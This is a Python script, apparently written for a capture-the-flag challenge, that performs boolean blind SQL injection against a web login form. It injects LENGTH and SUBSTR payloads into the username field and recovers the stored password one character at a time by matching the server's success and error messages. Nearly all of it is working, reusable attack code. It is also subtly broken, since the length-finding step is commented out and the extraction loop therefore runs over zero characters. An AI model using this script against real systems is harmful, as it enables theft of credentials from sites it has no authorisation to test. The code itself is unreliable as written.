#!/usr/bin/env python3

from string import \
ascii_lowercase as L, \
ascii_uppercase as U, \
digits as D, \
punctuation as P

import requests

##### Config
HOST = "http://web.server.org"
PORT = 80
PATH = "/challenge/sqli/"
METHOD = "POST"
COOKIES = {
    "uid": "123456"
}
DATA = {
    "username": "<PAYLOAD>",
    "password": "foo"
}
CHARSET = D + L + U + P

PAYLOAD_LENGTH = "admin' AND LENGTH(password) = <LEN> --+"
PAYLOAD_BLIND = "admin' AND SUBSTR(password, <POS>, 1) = '<CHR>' --+"

SERVER_YES = "Welcome back"
SERVER_NO = "Error : no such user/password"
##########

class BlindSQLi:
    def __init__(self, host, method, cookies, charset, payload_length, payload_blind):
        self.host = host
        self.method = method
        self.cookies = cookies
        self.charset = charset
        self.length = 0
        self.maxlength = 100
        self.payload_length = payload_length
        self.payload_blind = payload_blind
        self.flag = ""

        self.s = requests.Session()
        self.s.cookies.update(COOKIES)

        # self.blind_length()
        self.blind()

    def blind_length(self):
        for i in range(self.maxlength):
            if i == self.maxlength:
                print('[x] Reached max length')
                exit()

            payload = PAYLOAD_LENGTH.replace("<LEN>", str(i))
            data = {}
            for k in DATA.keys():
                if "<PAYLOAD>" in DATA[k]:
                    data[k] = DATA[k].replace("<PAYLOAD>", payload)
                else:
                    data[k] = DATA[k]

            r = self.send(data)
            res = r.text

            if SERVER_NO in res:
                continue
            elif SERVER_YES in res:
                self.length = i
                break
            else:
                print("[x] Can't find SERVER_NO nor SERVER_YES in response")
                exit()

        print("[+] Length:", self.length)

    def blind(self):
        for i in range(1, self.length + 1):
            for c in CHARSET:
                payload = PAYLOAD_BLIND.replace("<POS>", str(i)).replace("<CHR>", c)
                data = {}
                for k in DATA.keys():
                    if "<PAYLOAD>" in DATA[k]:
                        data[k] = DATA[k].replace("<PAYLOAD>", payload)
                    else:
                        data[k] = DATA[k]

                r = self.send(data)
                res = r.text

                if SERVER_NO in res:
                    continue
                elif SERVER_YES in res:
                    self.flag += c
                    print("[+] Flag:", self.flag, end='\r', flush=True)
                    break
                else:
                    print("[x] Can't find SERVER_NO nor SERVER_YES in response")
                    exit()

            if len(self.flag) != i:
                print("[x] Charset seems incomplete")
                exit()

        print()
        print("[+] Finished")

    def send(self, data):
        if self.method == "POST":
            return self.s.post(self.host, data=data)
        elif self.method == "GET":
            get_params_str = '?'
            for k in data.keys():
                if list(data.keys()).index(k) != 0:
                    get_params_str += '&'
                get_params_str += (k + '=' + data[k])
            return self.s.get(self.host + get_params_str)
        else:
            print ("[x] Invalid method:", METHOD)
            exit()


if __name__ == "__main__":
    blind = BlindSQLi( HOST+':'+str(PORT)+PATH, METHOD, COOKIES, CHARSET, PAYLOAD_LENGTH, PAYLOAD_BLIND )
